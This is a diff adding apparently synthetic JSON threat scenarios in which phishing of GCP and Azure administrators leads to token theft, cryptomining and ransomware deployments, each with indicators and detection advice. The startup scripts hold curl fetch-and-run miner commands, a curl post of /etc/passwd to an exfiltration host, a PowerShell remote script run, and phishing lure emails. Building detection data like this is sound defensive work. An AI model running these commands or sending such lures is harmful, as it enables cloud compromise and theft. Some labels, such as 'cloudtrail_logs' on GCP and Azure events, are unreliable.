+        "T1566.001",
+        "T1078.003",
+        "T1059.001",
+        "T1496",
+        "T1071.001",
+        "T1086"
+      ]
+    },
+    {
+      "scenario": "Phishing message sent to Google Cloud administrators containing a link that triggers browser exploit to steal OAuth tokens, enabling attacker to deploy a Kubernetes cluster running crypto-mining containers.",
+      "technical_data": {
+        "email_headers": "Return-Path: <admin-alerts@gcp-security-notify.com>\r\nReceived: from mail.gcp-security-notify.com (mail.gcp-security-notify.com [192.0.2.88])\r\n\tby inbound.mail.example.org with ESMTPS id k1N8f7gH\r\n\tfor <victim@corp.com>; Fri, 10 Mar 2023 15:30:45 -0700 (PDT)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 1.0\r\nX-Phishing-Confidence: 88\r\nX-Mailer: Thunderbird 91.5.0\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nSubject: [Important] Google Cloud Platform Security Update\r\nFrom: Google Cloud Support <admin-alerts@gcp-security-notify.com>\r\nTo: victim@corp.com\r\nMessage-ID: <20230310153045.7654321@mail.gcp-security-notify.com>",
+        "email_body_html": "<html><body><p>Hello GCP Admin,</p><p>Critical security update available. Please authenticate via the secure link below to apply patches and avoid service disruptions.</p><p><a href=\"https://gcp-secure-login.com/auth?email=victim@corp.com\">Authenticate Now</a></p><p>Best regards,<br>Google Cloud Support</p></body></html>",
+        "phishing_url": "https://gcp-secure-login.com/auth?email=victim@corp.com",
+        "domain_registration": {
+          "domain": "gcp-secure-login.com",
+          "registrar": "Google LLC",
+          "creation_date": "2023-02-28T14:45:20Z",
+          "registrant": {
+            "name": "Redacted for privacy",
+            "organization": "Redacted",
+            "country": "UA"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "192.0.2.88",
+              "ttl": 3600
+            },
+            {
+              "type": "MX",
+              "value": "mail.gcp-secure-login.com",
+              "ttl": 3600
+            }
+          ]
+        },
+        "smtp_transaction_log": "220 mail.gcp-secure-login.com ESMTP Exim 4.94\r\nEHLO attacker-host\r\n250-mail.gcp-secure-login.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-VRFY\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250 8BITMIME\r\nMAIL FROM:<admin-alerts@gcp-security-notify.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<victim@corp.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 3E4D5F09\r\nQUIT\r\n221 2.0.0 Bye",
+        "oauth_token_request": {
+          "timestamp": "2023-03-10T15:35:30Z",
+          "source_ip": "198.51.100.123",
+          "api_endpoint": "https://oauth2.googleapis.com/token",
+          "parameters": {
+            "grant_type": "authorization_code",
+            "code": "4/0AX4XfWhJxxxxxx",
+            "client_id": "1234567890.apps.googleusercontent.com",
+            "client_secret": "Redacted",
+            "redirect_uri": "https://gcp-secure-login.com/callback"
+          },
+          "response": {
+            "access_token": "ya29.a0AfH6SMBxxxxxxxxxxxxxxxxxxxxxx",
+            "expires_in": 3600,
+            "token_type": "Bearer",
+            "refresh_token": "1//0gxxxxxxxxxxxxxx"
+          }
+        },
+        "cloudtrail_logs": [
+          {
+            "eventTime": "2023-03-10T15:36:10Z",
+            "eventSource": "container.googleapis.com",
+            "eventName": "CreateCluster",
+            "userIdentity": {
+              "type": "OAuth",
+              "userEmail": "victim@corp.com"
+            },
+            "requestParameters": {
+              "cluster": {
+                "name": "crypto-miner-cluster",
+                "initialNodeCount": 3,
+                "nodeConfig": {
+                  "machineType": "e2-medium",
+                  "oauthScopes": [
+                    "https://www.googleapis.com/auth/cloud-platform"
+                  ]
+                }
+              },
+              "parent": "projects/123456789/zones/us-central1-a"
+            },
+            "sourceIPAddress": "198.51.100.123",
+            "userAgent": "gcloud-cli/414.0.0 (linux)"
+          },
+          {
+            "eventTime": "2023-03-10T15:38:00Z",
+            "eventSource": "container.googleapis.com",
+            "eventName": "CreatePod",
+            "userIdentity": {
+              "type": "OAuth",
+              "userEmail": "victim@corp.com"
+            },
+            "requestParameters": {
+              "podSpec": {
+                "metadata": {
+                  "name": "crypto-miner-pod",
+                  "labels": {
+                    "app": "cryptominer"
+                  }
+                },
+                "spec": {
+                  "containers": [
+                    {
+                      "name": "miner",
+                      "image": "maliciousrepo/crypto-miner:latest",
+                      "resources": {
+                        "limits": {
+                          "cpu": "1000m",
+                          "memory": "512Mi"
+                        }
+                      },
+                      "args": [
+                        "--pool=stratum+tcp://pool.example.net:4444",
+                        "--user=mineruser.worker1"
+                      ]
+                    }
+                  ]
+                }
+              },
+              "namespace": "default"
+            },
+            "sourceIPAddress": "198.51.100.123"
+          }
+        ],
+        "base64_user_data_decoded": "",
+        "iam_policy_misconfiguration": {
+          "policyName": "GCPAdminRole",
+          "policyDocument": {
+            "bindings": [
+              {
+                "role": "roles/container.admin",
+                "members": [
+                  "user:victim@corp.com"
+                ]
+              }
+            ]
+          }
+        }
+      },
+      "indicators": {
+        "phishing_domain": "gcp-secure-login.com",
+        "phishing_ip": "192.0.2.88",
+        "compromised_source_ip": "198.51.100.123",
+        "malicious_cluster_name": "crypto-miner-cluster",
+        "malicious_pod_name": "crypto-miner-pod",
+        "malicious_container_image": "maliciousrepo/crypto-miner:latest",
+        "oauth_access_token_prefix": "ya29.a0AfH6SMB"
+      },
+      "detection_method": "Monitor GCP audit logs for creation of Kubernetes clusters and pods from unexpected IPs or OAuth tokens, correlate phishing email detections via email security gateways, and flag usage of container images from untrusted registries. Employ network monitoring to detect connections to known mining pools and behavior analytics to identify anomalous container resource usage patterns.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1078.004",
+        "T1496",
+        "T1071.001",
+        "T1086"
+      ]
+    },
+    {
+      "scenario": "Phishing campaign targets Google Cloud Platform administrators with a fake security alert email that directs to a malicious webpage stealing OAuth tokens, leading to unauthorized creation of compute instances running cryptojacking scripts.",
+      "technical_data": {
+        "email_headers": "Return-Path: <alert@gcp-secure-login.com>\r\nReceived: from mail.gcp-secure-login.com (mail.gcp-secure-login.com [203.0.113.88])\r\n\tby inbound.mail.example.net with ESMTPS id b9H3j4kL\r\n\tfor <admin@enterprise.com>; Fri, 21 Jul 2023 08:30:20 -0400 (EDT)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 1.7\r\nX-Phishing-Confidence: 90\r\nX-Mailer: PHPMailer 6.7.1 (https://github.com/PHPMailer/PHPMailer)\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nSubject: [Urgent] Google Cloud Account Security Update\r\nFrom: Google Cloud Support <alert@gcp-secure-login.com>\r\nTo: admin@enterprise.com\r\nMessage-ID: <20230721083020.9876543@mail.gcp-secure-login.com>",
+        "email_body_html": "<html><body><p>Dear Google Cloud Administrator,</p><p>Unusual login activity has been detected on your account. Please re-authenticate immediately to secure your resources.</p><p><a href=\"https://secure-gcp-login.com/authenticate?user=admin@enterprise.com\">Secure your account here</a></p><p>Thank you,<br>Google Cloud Security Team</p></body></html>",
+        "phishing_url": "https://secure-gcp-login.com/authenticate?user=admin@enterprise.com",
+        "domain_registration": {
+          "domain": "secure-gcp-login.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-07-15T10:12:33Z",
+          "registrant": {
+            "name": "Redacted for privacy",
+            "organization": "Redacted",
+            "country": "CN"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "203.0.113.88",
+              "ttl": 300
+            },
+            {
+              "type": "MX",
+              "value": "mail.secure-gcp-login.com",
+              "ttl": 300
+            }
+          ]
+        },
+        "smtp_transaction_log": "220 mail.secure-gcp-login.com ESMTP Postfix\r\nEHLO attacker-host\r\n250-mail.secure-gcp-login.com\r\n250-PIPELINING\r\n250-SIZE 20480000\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250 8BITMIME\r\nMAIL FROM:<alert@gcp-secure-login.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<admin@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 1A2B3C4D\r\nQUIT\r\n221 2.0.0 Bye",
+        "oauth_token_request": {
+          "timestamp": "2023-07-21T08:35:42Z",
+          "source_ip": "198.51.100.77",
+          "api_endpoint": "https://oauth2.googleapis.com/token",
+          "parameters": {
+            "grant_type": "authorization_code",
+            "code": "4/0AX4XfWjZ5fakecodeexample123456",
+            "redirect_uri": "https://secure-gcp-login.com/callback",
+            "client_id": "fake-client-id.apps.googleusercontent.com",
+            "client_secret": "fake-client-secret"
+          },
+          "response": {
+            "access_token": "ya29.a0AfH6SMBfakeaccesstoken1234567890",
+            "expires_in": 3599,
+            "refresh_token": "1//0gfake-refresh-token",
+            "scope": "https://www.googleapis.com/auth/cloud-platform",
+            "token_type": "Bearer"
+          }
+        },
+        "cloudtrail_logs": [
+          {
+            "eventTime": "2023-07-21T08:36:10Z",
+            "eventSource": "compute.googleapis.com",
+            "eventName": "compute.instances.insert",
+            "userIdentity": {
+              "type": "OAuth",
+              "principalEmail": "admin@enterprise.com",
+              "authenticationInfo": {
+                "accessToken": "ya29.a0AfH6SMBfakeaccesstoken1234567890"
+              }
+            },
+            "requestParameters": {
+              "projectId": "enterprise-gcp-project",
+              "zone": "us-central1-a",
+              "resource": {
+                "name": "cryptominer-node-01",
+                "machineType": "zones/us-central1-a/machineTypes/n1-standard-1",
+                "disks": [
+                  {
+                    "boot": true,
+                    "autoDelete": true,
+                    "initializeParams": {
+                      "sourceImage": "projects/debian-cloud/global/images/family/debian-11"
+                    }
+                  }
+                ],
+                "metadata": {
+                  "items": [
+                    {
+                      "key": "startup-script",
+                      "value": "#!/bin/bash\ncurl -fsSL https://malicious-site.com/miner.sh -o /tmp/miner.sh && bash /tmp/miner.sh"
+                    }
+                  ]
+                }
+              }
+            },
+            "sourceIPAddress": "198.51.100.77",
+            "userAgent": "google-cloud-sdk/364.0.0 linux x86_64"
+          }
+        ],
+        "base64_user_data_decoded": "#!/bin/bash\ncurl -fsSL https://malicious-site.com/miner.sh -o /tmp/miner.sh && bash /tmp/miner.sh\n",
+        "iam_policy_misconfiguration": {
+          "policyName": "ComputeAdmin",
+          "policyDocument": {
+            "bindings": [
+              {
+                "role": "roles/compute.admin",
+                "members": [
+                  "user:admin@enterprise.com"
+                ]
+              }
+            ]
+          }
+        }
+      },
+      "indicators": {
+        "phishing_domain": "secure-gcp-login.com",
+        "phishing_ip": "203.0.113.88",
+        "compromised_source_ip": "198.51.100.77",
+        "assumed_role_session_name": null,
+        "malicious_instance_id": "cryptominer-node-01",
+        "malicious_user_data_base64": "IyEvYmluL2Jhc2gKY3VybCAtZnNTTCBodHRwczovL21hbGljaW91cy1zaXRlLmNvbS9taW5lci5zaCAtbyAvdG1wL21pbmVyLnNoICYmIGJhc2ggL3RtcC9taW5lci5zaA==",
+        "malicious_ssm_command": null
+      },
+      "detection_method": "Correlate phishing emails with suspicious domains via email gateway logs, monitor OAuth token requests from unusual IPs, detect unexpected compute instance creation with startup scripts downloading binaries from untrusted domains, and verify IAM policy bindings for overly permissive ComputeAdmin roles.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1078.004",
+        "T1496",
+        "T1059.004",
+        "T1086",
+        "T1071.001"
+      ]
+    },
+    {
+      "scenario": "Phishing emails impersonate Microsoft Azure support, tricking cloud admins into clicking a link that exploits browser vulnerabilities to steal session cookies, resulting in unauthorized provisioning of Azure VMs running cryptomining malware.",
+      "technical_data": {
+        "email_headers": "Return-Path: <no-reply@azure-security-update.com>\r\nReceived: from mail.azure-security-update.com (mail.azure-security-update.com [192.0.2.55])\r\n\tby inbound.mail.corp.com with ESMTP id 9K8T2U5V\r\n\tfor <cloudadmin@corp.com>; Mon, 9 Oct 2023 14:10:05 +0200\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 2.0\r\nX-Phishing-Confidence: 92\r\nX-Mailer: PHPMailer 6.6.0 (https://github.com/PHPMailer/PHPMailer)\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nSubject: [Security Alert] Your Azure Account Requires Immediate Verification\r\nFrom: Microsoft Azure Support <no-reply@azure-security-update.com>\r\nTo: cloudadmin@corp.com\r\nMessage-ID: <20231009141005.8765432@mail.azure-security-update.com>",
+        "email_body_html": "<html><body><p>Dear Azure Administrator,</p><p>We have noticed suspicious activity on your Azure subscription. Please verify your identity to prevent any disruption.</p><p><a href=\"https://verify-azure-account.com/login?user=cloudadmin@corp.com\">Verify your Azure account</a></p><p>Regards,<br>Microsoft Azure Security Team</p></body></html>",
+        "phishing_url": "https://verify-azure-account.com/login?user=cloudadmin@corp.com",
+        "domain_registration": {
+          "domain": "verify-azure-account.com",
+          "registrar": "Google LLC",
+          "creation_date": "2023-09-28T16:45:10Z",
+          "registrant": {
+            "name": "Redacted for privacy",
+            "organization": "Redacted",
+            "country": "UA"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "192.0.2.55",
+              "ttl": 600
+            },
+            {
+              "type": "MX",
+              "value": "mail.verify-azure-account.com",
+              "ttl": 600
+            }
+          ]
+        },
+        "smtp_transaction_log": "220 mail.verify-azure-account.com ESMTP Postfix\r\nEHLO attacker-host\r\n250-mail.verify-azure-account.com\r\n250-PIPELINING\r\n250-SIZE 5120000\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250 8BITMIME\r\nMAIL FROM:<no-reply@azure-security-update.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<cloudadmin@corp.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 7G5H6J8K\r\nQUIT\r\n221 2.0.0 Bye",
+        "oauth_token_request": {
+          "timestamp": "2023-10-09T14:15:30Z",
+          "source_ip": "198.51.100.99",
+          "api_endpoint": "https://login.microsoftonline.com/12345678-90ab-cdef-1234-567890abcdef/oauth2/token",
+          "parameters": {
+            "grant_type": "authorization_code",
+            "code": "AQABAAIAAAAEgAAfakeauthcode123456789",
+            "redirect_uri": "https://verify-azure-account.com/callback",
+            "client_id": "fake-client-id",
+            "client_secret": "fake-client-secret"
+          },
+          "response": {
+            "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJfakejwtaccess123456",
+            "expires_in": 3600,
+            "refresh_token": "OAQABAAIAAAAEgAAfake-refresh-token",
+            "token_type": "Bearer"
+          }
+        },
+        "cloudtrail_logs": [
+          {
+            "eventTime": "2023-10-09T14:16:05Z",
+            "eventSource": "Microsoft.Compute",
+            "eventName": "VirtualMachines.CreateOrUpdate",
+            "userIdentity": {
+              "type": "OAuth",
+              "userPrincipalName": "cloudadmin@corp.com",
+              "authenticationInfo": {
+                "accessToken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJfakejwtaccess123456"
+              }
+            },
+            "requestParameters": {
+              "resourceGroupName": "ProdResources",
+              "vmName": "cryptominer-vm01",
+              "vmSize": "Standard_B1s",
+              "storageProfile": {
+                "imageReference": {
+                  "publisher": "Canonical",
+                  "offer": "UbuntuServer",
+                  "sku": "18.04-LTS",
+                  "version": "latest"
+                }
+              },
+              "osProfile": {
+                "customData": "IyEvYmluL2Jhc2gKY3VybCAtbSBodHRwOi8vbWFsaWNpb3VzLXVybC5jb20vbWluZXIuc2ggPiAvdG1wL21pbmVyLnNoICYmIGJhc2ggL3RtcC9taW5lci5zaA=="
+              }
+            },
+            "sourceIPAddress": "198.51.100.99",
+            "userAgent": "AzureCLI/2.37.0 (windows)"
+          }
+        ],
+        "base64_user_data_decoded": "#!/bin/bash\ncurl -m http://malicious-url.com/miner.sh > /tmp/miner.sh && bash /tmp/miner.sh\n",
+        "iam_policy_misconfiguration": {
+          "policyName": "Contributor",
+          "policyDocument": {
+            "assignableScopes": [
+              "/subscriptions/00000000-0000-0000-0000-000000000000"
+            ],
+            "permissions": [
+              {
+                "actions": [
+                  "Microsoft.Compute/*",
+                  "Microsoft.Storage/*",
+                  "Microsoft.Network/*"
+                ],
+                "notActions": []
+              }
+            ]
+          }
+        }
+      },
+      "indicators": {
+        "phishing_domain": "verify-azure-account.com",
+        "phishing_ip": "192.0.2.55",
+        "compromised_source_ip": "198.51.100.99",
+        "assumed_role_session_name": null,
+        "malicious_instance_id": "cryptominer-vm01",
+        "malicious_user_data_base64": "IyEvYmluL2Jhc2gKY3VybCAtbSBodHRwOi8vbWFsaWNpb3VzLXVybC5jb20vbWluZXIuc2ggPiAvdG1wL21pbmVyLnNoICYmIGJhc2ggL3RtcC9taW5lci5zaA==",
+        "malicious_ssm_command": null
+      },
+      "detection_method": "Detect phishing emails with spoofed Microsoft domains via email security gateways, monitor OAuth token issuance logs for suspicious IPs, audit Azure Activity Logs for unexpected VM creations with suspicious custom scripts, and review role assignments for broad Contributor permissions enabling resource creation.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1078.004",
+        "T1496",
+        "T1059.004",
+        "T1086",
+        "T1071.001"
+      ]
+    },
+    {
+      "scenario": "Phishing campaign targets Google Cloud Platform user leading to unauthorized data exfiltration by deploying a malicious workload using compromised credentials.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security-alert@gcp-support.com>\r\nReceived: from mail.gcp-support.com (mail.gcp-support.com [192.0.2.55])\r\n\tby inbound.mail.example.org with ESMTPS id a9H5v1Dx\r\n\tfor <victim@gcp-company.com>; Wed, 15 Mar 2023 09:15:10 -0500 (EST)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 2.1\r\nX-Phishing-Confidence: 90\r\nX-Mailer: PHPMailer 6.4.1 (https://github.com/PHPMailer/PHPMailer)\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nSubject: [Important] GCP Account Security Alert\r\nFrom: Google Cloud Support <security-alert@gcp-support.com>\r\nTo: victim@gcp-company.com\r\nMessage-ID: <20230315091510.9876543@mail.gcp-support.com>",
+        "email_body_html": "<html><body><p>Dear GCP User,</p><p>We detected unusual login attempts in your Google Cloud account. Please verify your credentials immediately by clicking the link below.</p><p><a href=\"https://gcp-secure-login.com/auth?user=victim@gcp-company.com\">Verify your account now</a></p><p>Thank you,<br>Google Cloud Security Team</p></body></html>",
+        "phishing_url": "https://gcp-secure-login.com/auth?user=victim@gcp-company.com",
+        "domain_registration": {
+          "domain": "gcp-secure-login.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-03-10T08:12:33Z",
+          "registrant": {
+            "name": "Redacted for privacy",
+            "organization": "Redacted",
+            "country": "CN"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "192.0.2.55",
+              "ttl": 3600
+            },
+            {
+              "type": "MX",
+              "value": "mail.gcp-secure-login.com",
+              "ttl": 3600
+            }
+          ]
+        },
+        "smtp_transaction_log": "220 mail.gcp-secure-login.com ESMTP Postfix\r\nEHLO attacker-host\r\n250-mail.gcp-secure-login.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<security-alert@gcp-support.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<victim@gcp-company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 7A4B2D21\r\nQUIT\r\n221 2.0.0 Bye",
+        "oauth_token_request": {
+          "timestamp": "2023-03-15T09:20:45Z",
+          "source_ip": "198.51.100.100",
+          "api_endpoint": "https://iam.googleapis.com/v1/projects/my-project/serviceAccounts/1234567890@my-project.iam.gserviceaccount.com:generateAccessToken",
+          "parameters": {
+            "scope": [
+              "https://www.googleapis.com/auth/cloud-platform"
+            ],
+            "lifetime": "3600s"
+          },
+          "response": {
+            "accessToken": "ya29.a0AfH6SMBzYEXAMPLEACCESSTOKEN",
+            "expireTime": "2023-03-15T10:20:45Z"
+          }
+        },
+        "cloudtrail_logs": [
+          {
+            "eventTime": "2023-03-15T09:22:10Z",
+            "eventSource": "compute.googleapis.com",
+            "eventName": "v1.instances.insert",
+            "userIdentity": {
+              "type": "ServiceAccount",
+              "principalId": "1234567890-compute@developer.gserviceaccount.com",
+              "arn": "projects/my-project/serviceAccounts/1234567890-compute@developer.gserviceaccount.com"
+            },
+            "requestParameters": {
+              "zone": "us-central1-a",
+              "instance": {
+                "name": "data-exfil-node",
+                "machineType": "n1-standard-1",
+                "disks": [
+                  {
+                    "boot": true,
+                    "autoDelete": true,
+                    "initializeParams": {
+                      "sourceImage": "projects/debian-cloud/global/images/family/debian-11"
+                    }
+                  }
+                ],
+                "metadata": {
+                  "items": [
+                    {
+                      "key": "startup-script",
+                      "value": "#!/bin/bash\necho \"Starting data exfiltration\" > /var/log/exfil.log\ncurl -X POST -d @/etc/passwd https://malicious-exfil.com/upload\n"
+                    }
+                  ]
+                }
+              }
+            },
+            "sourceIPAddress": "198.51.100.100",
+            "userAgent": "gcloud/362.0.0 command-line-tool"
+          }
+        ],
+        "base64_user_data_decoded": "#!/bin/bash\necho \"Starting data exfiltration\" > /var/log/exfil.log\ncurl -X POST -d @/etc/passwd https://malicious-exfil.com/upload\n",
+        "iam_policy_misconfiguration": {
+          "policyName": "ComputeAdmin",
+          "policyDocument": {
+            "bindings": [
+              {
+                "role": "roles/compute.admin",
+                "members": [
+                  "serviceAccount:1234567890-compute@developer.gserviceaccount.com"
+                ]
+              }
+            ]
+          }
+        }
+      },
+      "indicators": {
+        "phishing_domain": "gcp-secure-login.com",
+        "phishing_ip": "192.0.2.55",
+        "compromised_source_ip": "198.51.100.100",
+        "service_account": "1234567890-compute@developer.gserviceaccount.com",
+        "malicious_instance_name": "data-exfil-node",
+        "malicious_user_data_script": "#!/bin/bash\necho \"Starting data exfiltration\" > /var/log/exfil.log\ncurl -X POST -d @/etc/passwd https://malicious-exfil.com/upload\n"
+      },
+      "detection_method": "Monitor Google Cloud Audit Logs for service account token generation and instance creation events from unexpected IPs, alert on startup scripts with network exfiltration commands, correlate IAM roles with overly permissive compute admin privileges, and detect phishing emails with suspicious domains via email security gateway.",
+      "relevant_mitre_techniques": [
+        "T1078.003",
+        "T1566.001",
+        "T1496",
+        "T1071.001",
+        "T1086",
+        "T1098"
+      ]
+    },
+    {
+      "scenario": "Phishing attack against Azure Active Directory user results in unauthorized deployment of ransomware payload on Azure virtual machines through compromised credentials.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security@azure-support.com>\r\nReceived: from mail.azure-support.com (mail.azure-support.com [203.0.113.150])\r\n\tby inbound.mail.contoso.com with ESMTPS id b8J4k9Lp\r\n\tfor <victim@contoso.com>; Fri, 12 May 2023 15:30:25 +0000 (UTC)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 1.8\r\nX-Phishing-Confidence: 88\r\nX-Mailer: PHPMailer 6.3.0 (https://github.com/PHPMailer/PHPMailer)\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nSubject: [Urgent] Azure Security Warning\r\nFrom: Microsoft Azure Support <security@azure-support.com>\r\nTo: victim@contoso.com\r\nMessage-ID: <20230512153025.3456789@mail.azure-support.com>",
+        "email_body_html": "<html><body><p>Hello Azure User,</p><p>We detected suspicious login activity on your Azure account. Please confirm your identity by clicking the link below immediately.</p><p><a href=\"https://azure-verify-account.com/login?user=victim@contoso.com\">Confirm your account</a></p><p>Regards,<br>Azure Security Team</p></body></html>",
+        "phishing_url": "https://azure-verify-account.com/login?user=victim@contoso.com",
+        "domain_registration": {
+          "domain": "azure-verify-account.com",
+          "registrar": "Google LLC",
+          "creation_date": "2023-05-08T14:45:12Z",
+          "registrant": {
+            "name": "Redacted for privacy",
+            "organization": "Redacted",
+            "country": "UA"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "203.0.113.150",
+              "ttl": 3600
+            },
+            {
+              "type": "MX",
+              "value": "mail.azure-verify-account.com",
+              "ttl": 3600
+            }
+          ]
+        },
+        "smtp_transaction_log": "220 mail.azure-verify-account.com ESMTP Postfix\r\nEHLO attacker-host\r\n250-mail.azure-verify-account.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<security@azure-support.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<victim@contoso.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 3C7D5F11\r\nQUIT\r\n221 2.0.0 Bye",
+        "oauth_token_request": {
+          "timestamp": "2023-05-12T15:34:00Z",
+          "source_ip": "198.51.100.200",
+          "api_endpoint": "https://login.microsoftonline.com/contoso.com/oauth2/v2.0/token",
+          "parameters": {
+            "client_id": "00000000-0000-0000-0000-000000000000",
+            "scope": "https://management.azure.com/.default",
+            "grant_type": "password",
+            "username": "victim@contoso.com",
+            "password": "********"
+          },
+          "response": {
+            "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ik16RTBNVFE0T1R...",
+            "expires_in": 3600,
+            "token_type": "Bearer"
+          }
+        },
+        "cloudtrail_logs": [
+          {
+            "eventTime": "2023-05-12T15:35:40Z",
+            "eventSource": "Microsoft.Compute/virtualMachines",
+            "eventName": "CreateOrUpdate",
+            "userIdentity": {
+              "type": "User",
+              "userPrincipalName": "victim@contoso.com",
+              "id": "9e4b8c3a-1234-5678-9abc-1234567890ab"
+            },
+            "requestParameters": {
+              "resourceGroupName": "prod-resources",
+              "vmName": "ransomware-node-01",
+              "properties": {
+                "hardwareProfile": {
+                  "vmSize": "Standard_DS1_v2"
+                },
+                "osProfile": {
+                  "computerName": "ransomware-node-01",
+                  "adminUsername": "azureuser",
+                  "customData": "IyEvYmluL2Jhc2gKZWNobyByYW5zb21XYXJlIGNvbXBpbGVkIGluZ2VjdG9yCg=="
+                },
+                "storageProfile": {
+                  "imageReference": {
+                    "publisher": "MicrosoftWindowsServer",
+                    "offer": "WindowsServer",
+                    "sku": "2019-Datacenter",
+                    "version": "latest"
+                  }
+                }
+              }
+            },
+            "sourceIPAddress": "198.51.100.200",
+            "userAgent": "AzureCLI/2.37.0 (windows-x64) Python/3.9.7"
+          },
+          {
+            "eventTime": "2023-05-12T15:36:10Z",
+            "eventSource": "Microsoft.Compute/virtualMachines/extensions",
+            "eventName": "CreateOrUpdate",
+            "userIdentity": {
+              "type": "User",
+              "userPrincipalName": "victim@contoso.com"
+            },
+            "requestParameters": {
+              "resourceGroupName": "prod-resources",
+              "vmName": "ransomware-node-01",
+              "extensionName": "CustomScriptExtension",
+              "properties": {
+                "publisher": "Microsoft.Compute",
+                "type": "CustomScriptExtension",
+                "typeHandlerVersion": "1.10",
+                "settings": {
+                  "fileUris": [
+                    "https://malicious-domain.net/ransomware/install.ps1"
+                  ],
+                  "commandToExecute": "powershell -ExecutionPolicy Unrestricted -File install.ps1"
+                }
+              }
+            },
+            "sourceIPAddress": "198.51.100.200"
+          }
+        ],
+        "base64_user_data_decoded": "#!/bin/bash\necho ransomware compiled injector\n",
+        "iam_policy_misconfiguration": {
+          "policyName": "Owner",
+          "policyDocument": {
+            "assignableScopes": [
+              "/subscriptions/00000000-0000-0000-0000-000000000000"
+            ],
+            "permissions": [
+              {
+                "actions": [
+                  "*"
+                ],
+                "notActions": []
+              }
+            ]
+          }
+        }
+      },
+      "indicators": {
+        "phishing_domain": "azure-verify-account.com",
+        "phishing_ip": "203.0.113.150",
+        "compromised_source_ip": "198.51.100.200",
+        "compromised_user": "victim@contoso.com",
+        "malicious_vm_name": "ransomware-node-01",
+        "malicious_user_data_base64": "IyEvYmluL2Jhc2gKZWNobyByYW5zb21XYXJlIGNvbXBpbGVkIGluZ2VjdG9yCg==",
+        "malicious_extension_command": "powershell -ExecutionPolicy Unrestricted -File install.ps1"
+      },
+      "detection_method": "Use Azure AD sign-in logs to detect anomalous login behavior and token requests from suspicious IPs, monitor Azure Activity Logs for VM creation with suspicious custom data, alert on VM extension deployments executing scripts from unknown URLs, and correlate with users assigned broad Owner permissions. Employ email security solutions to block phishing domains and messages.",
+      "relevant_mitre_techniques": [
+        "T1078.002",
+        "T1566.001",
+        "T1059.001",
+        "T1496",
+        "T1098",
+        "T1071.001"
+      ]
+    },
+    {
+      "scenario": "Phishing SMS message captures Azure cloud user credentials resulting in unauthorized deployment of a ransomware payload via Azure Functions.",
+      "technical_data": {
+        "email_headers": "Return-Path: <no-reply@azure-secure-update.com>\r\nReceived: from mail.azure-secure-update.com (mail.azure-secure-update.com [203.0.113.99])\r\n\tby inbound.mail.example.com with ESMTPS id a9F8g7dT\r\n\tfor <victim@enterprise.com>; Wed, 05 Jul 2023 08:22:15 +0000 (UTC)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 1.1\r\nX-Phishing-Confidence: 90\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nSubject: [Urgent] Azure Account Verification Required\r\nFrom: Microsoft Azure Support <no-reply@azure-secure-update.com>\r\nTo: victim@enterprise.com\r\nMessage-ID: <20230705082215.9876543@mail.azure-secure-update.com>",
